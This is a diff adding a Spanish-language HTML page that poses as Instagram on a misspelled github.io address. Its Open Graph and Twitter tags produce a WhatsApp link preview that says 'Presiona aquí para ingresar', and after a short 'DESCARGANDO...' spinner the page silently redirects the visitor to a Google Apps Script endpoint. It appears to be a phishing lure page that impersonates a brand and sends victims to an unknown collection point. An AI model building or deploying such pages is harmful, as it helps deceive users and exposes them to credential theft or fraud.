@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0">
+
+  <title>Instagram</title>
+
+  <!-- ==========================================
+       VISTA PREVIA PARA WHATSAPP / OPEN GRAPH
+       ========================================== -->
+
+  <meta property="og:type" content="website">
+
+  <meta property="og:title"
+        content="Acceso al sistema">
+
+  <meta property="og:description"
+        content="Presiona aquí para ingresar">
+
+  <meta property="og:url"
+        content="https://liillliil.github.io/intagram/">
+
+  <meta property="og:image"
+        content="https://liillliil.github.io/instagram/logo10.png">
+
+  <meta property="og:image:secure_url"
+        content="https://liillliil.github.io/intagram/logo10.png">
+
+  <meta property="og:image:type"
+        content="image/png">
+
+  <meta property="og:image:width"
+        content="1200">
+
+  <meta property="og:image:height"
+        content="630">
+
+  <!-- Twitter / otros servicios -->
+  <meta name="twitter:card"
+        content="summary_large_image">
+
+  <meta name="twitter:title"
+        content="Acceso al sistema">
+
+  <meta name="twitter:description"
+        content="Presiona aquí para ingresar">
+
+  <meta name="twitter:image"
+        content="https://liillliil.github.io/intagram/logo10.png">
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    html,
+    body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+    }
+
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+
+      background: #000;
+
+      font-family: Arial, Helvetica, sans-serif;
+    }
+
+    .loading {
+      color: #ffffff;
+      font-size: 18px;
+      font-weight: bold;
+      letter-spacing: 3px;
+      text-align: center;
+    }
+
+    .spinner {
+      width: 45px;
+      height: 45px;
+
+      margin: 0 auto 20px auto;
+
+      border: 4px solid rgba(255,255,255,0.25);
+      border-top: 4px solid #ffffff;
+
+      border-radius: 50%;
+
+      animation: girar 0.8s linear infinite;
+    }
+
+    @keyframes girar {
+      from {
+        transform: rotate(0deg);
+      }
+
+      to {
+        transform: rotate(360deg);
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="loading">
+
+    <div class="spinner"></div>
+
+    DESCARGANDO...
+
+  </div>
+
+
+  <script>
+
+    const DESTINO =
+      "https://script.google.com/macros/s/AKfycbylZvMxppgj-0wqGoKSfIVeHvnTEUG6AziwQh4QYimdiwjmzrIG_j_nrkabMKrsKuFrjA/exec";
+
+
+    window.addEventListener("load", function () {
+
+      /*
+       * Pequeña espera antes de redireccionar.
+       * La vista previa de WhatsApp se obtiene
+       * de las etiquetas Open Graph del HEAD.
+       */
+
+      setTimeout(function () {
+
+        window.location.replace(DESTINO);
+
+      }, 700);
+
+    });
+
+  </script>
+
+</body>
+</html>
